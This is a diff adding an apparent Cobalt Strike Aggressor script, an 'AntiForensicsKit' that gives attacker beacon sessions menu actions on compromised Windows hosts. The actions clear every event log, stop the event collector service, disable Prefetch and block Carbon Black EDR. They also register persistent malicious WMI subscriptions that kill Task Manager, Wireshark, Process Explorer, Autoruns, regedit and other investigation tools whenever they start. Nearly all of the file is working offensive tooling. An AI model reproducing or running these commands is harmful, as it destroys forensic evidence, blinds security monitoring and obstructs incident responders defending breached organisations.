@@ -1,0 +1,118 @@
+# Actions in this kit center around antiforensics. If it slows an investigator down, it likely belongs in this kit. We all know antiforensics is best forensics
+# @Und3rf10w
+
+sub sysinternalkiller {
+	
+	if (-exists script_resource("AntiForensicsKit/scripts/PowerLurk.ps1")) {
+		return $path;
+	}
+	else {
+		prompt_file_open("Select the PowerLurk.ps1 file on your system", $null, false, {
+			$path = $1;
+			return $path;
+		});
+	}
+	
+	
+}
+
+
+
+popup beacon_bottom {
+	menu "AntiForensicsKit" {
+		item "Clear System Event Logs (psh)"{
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "powershell gcim -CimSession $CimSession -ClassName Win32_NTEventlogFile | icim -MethodName ClearEventLog");
+				bpowershell($1, "gcim -CimSession $CimSession -ClassName Win32_NTEventlogFile | icim -MethodName ClearEventLog");
+			}
+		}
+		item "Stop Windows Event Collector svc"{
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "sc stop wecsvc");
+				bshell($1, "sc stop wecsvc");
+			}
+		}
+		item "Check VM" {
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "powershell-import Check-VM.ps1");
+				bpowershell_import($1, script_resource("AntiForensicsKit/scripts/Check-VM.ps1"));
+				binput($1, "powershell Check-VM");
+				bpowershell($1, "Check-VM");
+			}
+		}
+		menu "Prefetch Management" {
+			item "Disable Prefetch" {
+				local('$bid');
+				foreach $bid ($1) {
+					bshell($bid,'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnablePrefetcher" /t REG_DWORD /F /D "0"');
+					bshell($bid,'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnableSuperfetcher" /t REG_DWORD /F /D "0"');
+					#bshell($1,'net stop eventlog /f');
+				}
+			}
+			item "Enable Prefetch" {
+					local('$bid');
+					foreach $bid ($1) {
+						bshell($bid,'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnablePrefetcher" /t REG_DWORD /F /D "3"');
+						bshell($bid,'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnableSuperfetcher" /t REG_DWORD /F /D "1"');
+				}
+			}
+		}
+		menu "Carbon Black" {
+			item "Block Carbon Black (<= 7.2.3P2)"{
+				local('$bid');
+				foreach $bid ($1) {
+					openOrActivate($bid);
+					bpowershell_import($bid, script_resource("AntiForensicsKit/scripts/Block-CarbonBlack.ps1"));
+					binput($bid, "powershell Block-CarbonBlack");
+					bpowershell($bid, "Block-CarbonBlack");
+				}
+			}
+			item "Restore Carbon Black"{
+				local('$bid');
+				foreach $bid ($1) {
+					openOrActivate($bid);
+					bpowershell_import($bid, script_resource("AntiForensicsKit/scripts/Block-CarbonBlack.ps1"));
+					binput($bid, "powershell Restore-CarbonBlack");
+					bpowershell($bid, "Restore-CarbonBlack");
+				}
+			}
+
+		
+
+		}
+
+			item "Sysinternal Killer" {
+		local('$bid');
+		foreach $bid ($1) {
+			
+
+
+$path = script_resource("AntiForensicsKit/scripts/PowerLurk.ps1");
+blog($bid, $path);
+	bpowershell_import($bid, $path);
+	bpowerpick($bid, 'Register-MaliciousWmiEvent -EventName KillProc1 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName taskmgr.exe');
+	bpowerpick($bid, 'Register-MaliciousWmiEvent -EventName KillProc2 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName wireshark.exe');
+	bpowerpick($bid, 'Register-MaliciousWmiEvent -EventName KillProc3 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName tcpview.exe');
+	bpowerpick($bid, 'Register-MaliciousWmiEvent -EventName KillProc4 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName procdump.exe');
+	bpowerpick($bid, 'Register-MaliciousWmiEvent -EventName KillProc5 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName procexp.exe');
+	bpowerpick($bid, 'Register-MaliciousWmiEvent -EventName KillProc6 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName procmon.exe');
+	bpowerpick($bid, 'Register-MaliciousWmiEvent -EventName KillProc7 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName netstat.exe');
+	bpowerpick($bid, 'Register-MaliciousWmiEvent -EventName KillProc8 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName psloggedon.exe');
+	bpowerpick($bid, 'Register-MaliciousWmiEvent -EventName KillProc9 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName logonsessions.exe');
+	bpowerpick($bid, 'Register-MaliciousWmiEvent -EventName KillProc10 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName processhacker.exe');
+	bpowerpick($bid, 'Register-MaliciousWmiEvent -EventName KillProc11 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName autoruns.exe');
+	bpowerpick($bid, 'Register-MaliciousWmiEvent -EventName KillProc12 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName autorunsc.exe');
+	bpowerpick($bid, 'Register-MaliciousWmiEvent -EventName KillProc13 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName regedit.exe');
+	bpowerpick($bid, 'Register-MaliciousWmiEvent -EventName KillProc14 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName regshot.exe');
+	bpowerpick($bid, 'Register-MaliciousWmiEvent -EventName KillProc15 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName procexp64.exe');
+	bpowerpick($bid, 'Register-MaliciousWmiEvent -EventName KillProc16 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName tcpview.exe');
+
+	
+
+		}
+	}
+	}
+}
